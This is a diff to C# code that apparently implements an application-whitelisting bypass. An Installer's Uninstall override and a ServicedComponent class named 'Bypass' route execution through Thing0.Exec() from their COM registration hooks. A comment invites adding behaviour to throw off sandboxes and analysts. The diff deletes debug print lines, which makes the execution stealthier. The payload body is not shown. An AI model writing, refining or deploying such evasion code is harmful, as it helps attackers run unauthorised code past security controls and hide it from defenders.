@@ -48,7 +48,6 @@ public class Program
 {
     public static void Main()
     {
-        Console.WriteLine("Hello From Main...I Don't Do Anything");
         //Add any behaviour here to throw off sandbox execution/analysts :)
     }
 
@@ -99,7 +98,6 @@ public class Thing1 : System.Configuration.Install.Installer
     public override void Uninstall(System.Collections.IDictionary savedState)
     {
 
-        Console.WriteLine("Hello There From Uninstall");
         Thing0.Exec();
 
     }
@@ -118,14 +116,12 @@ public class Bypass : ServicedComponent
     [ComRegisterFunction] //This executes if registration is successful
     public static void RegisterClass(string key)
     {
-        Console.WriteLine("I shouldn't really execute");
         Thing0.Exec();
     }
 
     [ComUnregisterFunction] //This executes if registration fails
     public static void UnRegisterClass(string key)
     {
-        Console.WriteLine("I shouldn't really execute either.");
         Thing0.Exec();
     }
 
